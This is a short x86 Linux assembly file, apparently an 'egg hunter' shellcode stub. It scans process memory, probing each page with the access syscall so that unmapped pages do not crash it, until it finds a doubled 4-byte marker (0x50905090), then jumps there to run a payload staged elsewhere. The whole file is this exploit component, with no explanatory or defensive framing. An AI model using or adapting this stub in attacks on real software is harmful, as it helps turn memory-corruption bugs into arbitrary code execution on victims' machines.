global _start

section .text
_start:
  mov ebx, 0x50905090
  xor ecx, ecx
  mul ecx

jump1:
  or dx, 0xfff

jump2:
  inc edx
  pusha
  lea ebx, [edx+0x4]
  xor eax, eax
  mov al, 0x21
  int 0x80
  cmp al, 0xf2
  popa
  jz short jump1
  cmp dword [edx], ebx
  jnz short jump2
  cmp dword [edx+4], ebx
  jnz short jump2
  jmp edx